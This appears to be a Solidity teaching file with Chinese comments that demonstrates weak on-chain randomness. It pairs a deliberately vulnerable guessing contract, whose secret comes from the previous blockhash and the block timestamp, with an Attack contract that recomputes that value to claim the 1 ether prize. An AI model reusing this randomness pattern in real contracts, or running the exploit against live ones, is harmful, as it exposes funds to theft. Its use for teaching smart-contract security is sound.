// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/** block.number 当前区块的高度
 *  block.timestamp 块被开采的时间
 */

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        /* 猜中随机数，即可得到1 ether*/
        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}


/* 此处的产生随机数的方法并不是真正意义上的随机数，因为有被矿工控制的风险 */
contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    /* 用来查看是否收到 1 ether */
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}